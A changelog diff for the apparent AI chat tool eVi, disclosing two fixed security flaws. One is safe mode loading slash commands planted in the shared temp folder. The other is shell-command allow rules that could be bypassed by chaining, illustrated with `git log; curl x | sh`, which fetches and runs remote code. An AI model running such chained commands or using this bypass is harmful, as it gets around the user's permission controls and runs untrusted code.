@@ -6,6 +6,13 @@ All notable user-visible changes to eVi. Format loosely follows
 ## [Unreleased]
 
 ### Security
+- **Safe mode no longer offers slash commands from the system temp folder.**
+  Safe mode pointed the command store at a fresh temp folder, but the store
+  also scans its root's parent for `plugins/`, and that parent was the system
+  temp folder: on a shared Linux machine another user could create
+  `/tmp/plugins/<name>/commands/` and have `evi chat --safe-mode` and the web
+  app in safe mode offer those commands. The store now lives inside a private
+  temp folder of its own (`evi.commands.safe_mode_store`).
 - **Allowing one shell command no longer allows whatever is chained after it.**
   Rules were matched against the whole line, so `allow run_command git*` also
   approved `git log; curl x | sh`, and `destructive_allow =
